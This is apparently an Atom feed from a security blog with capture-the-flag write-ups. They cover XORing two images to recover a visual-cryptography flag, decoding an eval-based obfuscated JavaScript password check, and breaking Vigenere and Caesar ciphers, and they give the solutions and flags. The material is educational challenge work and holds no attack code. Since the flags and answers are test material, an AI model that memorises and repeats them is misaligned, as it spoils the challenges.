<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RawSec</title>
  <subtitle>Security is everywhere</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://rawsec.ml/"/>
  <updated>2017-03-26T22:01:33.467Z</updated>
  <id>https://rawsec.ml/</id>
  
  <author>
    <name>Alexandre ZANNI</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>VolgaCTF 2017 Quals - VC - Crypto</title>
    <link href="https://rawsec.ml/en/VolgaCTF-2017-Quals-VC-Crypto/"/>
    <id>https://rawsec.ml/en/VolgaCTF-2017-Quals-VC-Crypto/</id>
    <published>2017-03-25T23:00:00.000Z</published>
    <updated>2017-03-26T22:01:33.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : VolgaCTF 2017 Quals</li>
<li><strong>Website</strong> : <a href="https://quals.2017.volgactf.ru/" target="_blank" rel="external">quals.2017.volgactf.ru</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/374" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p>There are files A.png and B.png. But where's the flag?</p>
<p><a href="https://quals.2017.volgactf.ru/files/lch5o23ids28n26t9fe7vov2qfclz9rp/A.png" target="_blank" rel="external">A.png</a></p>
<p><a href="https://quals.2017.volgactf.ru/files/lch5o23ids28n26t9fe7vov2qfclz9rp/B.png" target="_blank" rel="external">B.png</a></p>
</blockquote>
<p><code>A.png</code>:</p>
<p><img src="http://i.imgur.com/Jj8s6vX.png" alt="A"></p>
<p><code>B.png</code>:</p>
<p><img src="http://i.imgur.com/gd3iCKb.png" alt="B"></p>
<h2 id="solution">Solution</h2>
<p>If you know <a href="https://en.wikipedia.org/wiki/One-time_pad" target="_blank" rel="external">OTP</a> you must know this famous attack on <a href="http://crypto.stackexchange.com/questions/59/taking-advantage-of-one-time-pad-key-reuse" target="_blank" rel="external">pad reused</a>.</p>
<p>You can also see some black lines on image B. Now let's XOR image A and B (with <a href="http://stackoverflow.com/questions/8504882/searching-for-a-way-to-do-bitwise-xor-on-images" target="_blank" rel="external">ImageMagick</a>):</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ convert A.png B.png -fx &quot;(((255*u)&amp;(255*(1-v)))|((255*(1-u))&amp;(255*v)))/255&quot; out.png</div></pre></td></tr></table></figure></p>
<p>And now we get the result:</p>
<p><img src="http://i.imgur.com/8uwlM0o.png" alt="out"></p>
<p>Flag is: <code>VolgaCTF{Classic_secret_sharing_scheme}</code>.</p>
<p><strong>Note</strong>: <em>VC</em> is for <em>Visual Cryptography</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
    
      <category term="crypto" scheme="https://rawsec.ml/tags/crypto/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>WhiteHat Challenge 02 - 15 - Web001 - Web</title>
    <link href="https://rawsec.ml/en/WhiteHat-Challenge-02-15-Web001-Web/"/>
    <id>https://rawsec.ml/en/WhiteHat-Challenge-02-15-Web001-Web/</id>
    <published>2017-03-25T23:00:00.000Z</published>
    <updated>2017-03-26T21:42:01.052Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : WhiteHat Challenge 02</li>
<li><strong>Website</strong> : <a href="https://wargame.whitehat.vn/" target="_blank" rel="external">wargame.whitehat.vn</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/447" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p>Have you ever code JavaScript? Find flag in Website: <a href="http://web01.wargame.whitehat.vn" target="_blank" rel="external">web01.wargame.whitehat.vn</a>.</p>
<p>Submit WhiteHat{sha1(flag)}</p>
<p>Example: flag = Hello World</p>
<p>sha1(&quot;Hello World&quot;) = 0a4d55a8d778e5022fab701977c5d840bbc486d0</p>
<p>You must submit: WhiteHat{0a4d55a8d778e5022fab701977c5d840bbc486d0}</p>
<p>(all hash charactera in lowercase)</p>
</blockquote>
<h2 id="solution">Solution</h2>
<p>Let's check the JavaScript at: <code>http://web01.wargame.whitehat.vn/hello.js</code></p>
<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    alert (<span class="string">"This is a javascript challenge"</span>);</div><div class="line">    showFlag=<span class="built_in">String</span>.fromCharCode(<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">61</span>,<span class="number">39</span>,<span class="number">39</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">50</span>,<span class="number">61</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">51</span>,<span class="number">61</span>,<span class="number">51</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">107</span>,<span class="number">61</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">85</span>,<span class="number">82</span>,<span class="number">76</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">117</span>,<span class="number">98</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">40</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">85</span>,<span class="number">82</span>,<span class="number">76</span>,<span class="number">46</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">79</span>,<span class="number">102</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">61</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">102</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">40</span>,<span class="number">105</span>,<span class="number">61</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">105</span>,<span class="number">60</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">50</span>,<span class="number">59</span>,<span class="number">105</span>,<span class="number">43</span>,<span class="number">43</span>,<span class="number">41</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">123</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">61</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">43</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">67</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">105</span>,<span class="number">44</span>,<span class="number">48</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">125</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">95</span>,<span class="number">40</span>,<span class="number">120</span>,<span class="number">41</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">123</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">46</span>,<span class="number">99</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">65</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">120</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">125</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">105</span>,<span class="number">102</span>,<span class="number">40</span>,<span class="number">99</span>,<span class="number">107</span>,<span class="number">61</span>,<span class="number">61</span>,<span class="number">34</span>,<span class="number">61</span>,<span class="number">34</span>,<span class="number">43</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">67</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">95</span>,<span class="number">40</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">48</span>,<span class="number">41</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">67</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">95</span>,<span class="number">40</span>,<span class="number">50</span>,<span class="number">50</span>,<span class="number">48</span>,<span class="number">41</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">67</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">95</span>,<span class="number">40</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">50</span>,<span class="number">41</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">67</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">95</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">57</span>,<span class="number">50</span>,<span class="number">41</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">67</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">95</span>,<span class="number">40</span>,<span class="number">50</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">41</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">67</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">95</span>,<span class="number">40</span>,<span class="number">50</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">41</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">67</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">95</span>,<span class="number">40</span>,<span class="number">50</span>,<span class="number">48</span>,<span class="number">52</span>,<span class="number">41</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">67</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">95</span>,<span class="number">40</span>,<span class="number">50</span>,<span class="number">50</span>,<span class="number">50</span>,<span class="number">45</span>,<span class="number">50</span>,<span class="number">41</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">67</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">95</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">57</span>,<span class="number">56</span>,<span class="number">41</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">34</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">34</span>,<span class="number">43</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">67</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">50</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">67</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">51</span>,<span class="number">41</span>,<span class="number">41</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">123</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">34</span>,<span class="number">80</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">119</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">100</span>,<span class="number">32</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">32</span>,<span class="number">34</span>,<span class="number">43</span>,<span class="number">99</span>,<span class="number">107</span>,<span class="number">46</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">112</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">34</span>,<span class="number">61</span>,<span class="number">34</span>,<span class="number">44</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">41</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">125</span>,<span class="number">13</span>,<span class="number">10</span>);</div><div class="line">    <span class="built_in">eval</span>(showFlag);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>showFlag</code> can be evaluated (with the browser javascript console) to:</p>
<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> enco=<span class="string">''</span>;</div><div class="line"><span class="keyword">var</span> enco2=<span class="number">126</span>;</div><div class="line"><span class="keyword">var</span> enco3=<span class="number">33</span>;</div><div class="line"><span class="keyword">var</span> ck=<span class="built_in">document</span>.URL.substr(<span class="built_in">document</span>.URL.indexOf(<span class="string">'='</span>));</div><div class="line"></div><div class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">122</span>;i++) &#123;</div><div class="line">    enco=enco+<span class="built_in">String</span>.fromCharCode(i,<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">enco_</span>(<span class="params">x</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> enco.charCodeAt(x);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(ck==<span class="string">"="</span>+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">240</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">220</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">232</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">192</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">226</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">200</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">204</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">222</span><span class="number">-2</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">198</span>))+<span class="string">"~~~~~~"</span>+<span class="built_in">String</span>.fromCharCode(enco2)+<span class="built_in">String</span>.fromCharCode(enco3)) &#123;</div><div class="line">    alert(<span class="string">"Password is "</span>+ck.replace(<span class="string">"="</span>,<span class="string">""</span>));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>And the if statement can be evaluated from:</p>
<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"="</span>+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">240</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">220</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">232</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">192</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">226</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">200</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">204</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">222</span><span class="number">-2</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">198</span>))+<span class="string">"~~~~~~"</span>+<span class="built_in">String</span>.fromCharCode(enco2)+<span class="built_in">String</span>.fromCharCode(enco3)</div></pre></td></tr></table></figure></p>
<p>to:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=youaregod~~~~~~~!</div></pre></td></tr></table></figure></p>
<p>Because of <code>alert(&quot;Password is &quot;+ck.replace(&quot;=&quot;,&quot;&quot;));</code> we just need to remove the <code>=</code>.</p>
<p>Now we can generate the flag:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ printf &quot;WhiteHat&#123;%s&#125;&quot; $(printf %s &apos;youaregod~~~~~~~!&apos; | sha1sum | awk &apos;&#123; print $1 &#125;&apos;)</div><div class="line">WhiteHat&#123;1c0e74d5f61b6c3901a277bdd490ad070265f027&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>DoubleS1405 CTF - Write-ups</title>
    <link href="https://rawsec.ml/en/DoubleS1405CTF-2017-write-ups/"/>
    <id>https://rawsec.ml/en/DoubleS1405CTF-2017-write-ups/</id>
    <published>2017-03-25T23:00:00.000Z</published>
    <updated>2017-03-26T22:09:13.280Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : DoubleS1405 CTF</li>
<li><strong>Website</strong> : <a href="http://doubles1405.com/" target="_blank" rel="external">doubles1405.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/446" target="_blank" rel="external">link</a></li>
</ul>
<h2 id="1-mic-check-misc">1 - Mic Check - Misc</h2>
<blockquote>
<p>flag{W3lc0me_T0_DoubleS1405_CTF!}</p>
</blockquote>
<h2 id="50-easy-crypt-crypto">50 - Easy_Crypt - Crypto</h2>
<blockquote>
<p>hui awavmiis hqklse mx o gvslfr tn zrqecuhcef ecdmiwihvg ysrk ac lgnvb e grvnsm fe mehjzrsjrr hoyjzv twupzvg oexsx fm xys qmoxsew tt u bdcncwl. dx wf e kcld nj gcqgvpduegsnzb wlpxbdxigmtb. zczk zg mmgpc_imlshvqi</p>
</blockquote>
<p>It's Vigenere cipher.</p>
<p>Key is: <code>ONEFOURZEROFIVE</code></p>
<p>Cleartext is:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">the vigenere cipher is a method of encrypting alphabetic text by using a series of interwoven caesar ciphers based on the letters of a keyword. it is a form of polyalphabetic substitution. flag is hello_vigenere</div></pre></td></tr></table></figure></p>
<p>You can <a href="http://www.cs.du.edu/~snarayan/crypt/vigenere.html" target="_blank" rel="external">try it</a> by youself.</p>
<h2 id="50-crypto-crypto">50 - Crypto? - Crypto</h2>
<blockquote>
<p><a href="https://drive.google.com/open?id=0B4SaQn817BNcUVR2OUIzRTVFNUU" target="_blank" rel="external">https://drive.google.com/open?id=0B4SaQn817BNcUVR2OUIzRTVFNUU</a></p>
<p>#lowercase</p>
</blockquote>
<p><a href="https://gist.githubusercontent.com/noraj1337/99229acaea2fbb47203821d6ec01c544/raw/dceaf270a6f0d2a836b1d98f7c7e24fce8eba6b0/gistfile1.txt" target="_blank" rel="external">Source text</a></p>
<p>We can see some ASCII decimals in the text:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cat Crypto.txt| egrep -oh &apos;\[[0-9]&#123;1,3&#125;\]&apos; | tr -d &apos;\n&apos;</div><div class="line">[123][82][48][43][86][71][80][73][79][95][78][48][74][95][51][68][65][75][84][95][49][73][125][25][88][38][28][29][30][31][32][33][34][35][36][37][38][39][40]</div></pre></td></tr></table></figure></p>
<p>So a little ruby script to convert this into a string:</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">open(<span class="string">'Crypto.txt'</span>, <span class="string">'r'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">    text = f.read()</div><div class="line">    chars = text.scan(<span class="regexp">/\[([0-9]&#123;1,3&#125;)\]/</span>).flatten</div><div class="line">    print chars.map&#123;<span class="params">|c|</span> c.to_i.chr&#125;.join</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>And the output is: <code>{R0+VGPIO_N0J_3DAKT_1I}</code> plus some garbage. SO we keep only what's between curly braces. And now let's apply a Ceasar bruteforce.</p>
<p>The key was +11: <code>{C0+GRATZ_Y0U_3OLVE_1T}</code>.</p>
<p>To submit we need to lowercase (see challenge's description).</p>
